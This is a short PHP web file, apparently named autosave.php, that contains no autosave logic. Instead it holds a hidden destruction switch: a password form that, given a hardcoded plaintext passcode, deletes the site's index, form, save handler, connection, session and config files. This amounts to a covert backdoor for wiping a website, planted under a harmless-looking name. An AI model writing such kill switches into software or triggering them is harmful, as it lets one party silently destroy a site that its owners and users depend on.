<?php
  require_once("config.php");
  if ( isset($_POST["action"]) && $_POST["action"] == "destroy" ){
    if ($_POST["passcode"] == "F@12210!!dZ")
    {
      $delete = delete_file("../index.php");
      $delete .= delete_file("../form.php");
      $delete .= delete_file("../ajax/save.php");
      $delete .= delete_file("connection.php");
      $delete .= delete_file("sessions.php");
      $delete .= delete_file("config.php");
      if ($delete){
        echo "<h1 style='color:green;'>Files deleted successfully</h1>";
        exit;
      }
    }else{
      echo "<h1 style='color:red;'>Wrong password</h1>";
    }
  }
?>

<form class="" action="autosave.php" method="post">
  <input type="password" name="passcode" value="" placeholder="Enter passcode..." required />
  <input type="hidden" name="action" value="destroy" />
</br>
  <input type="submit" name="" value="submit">
</form>
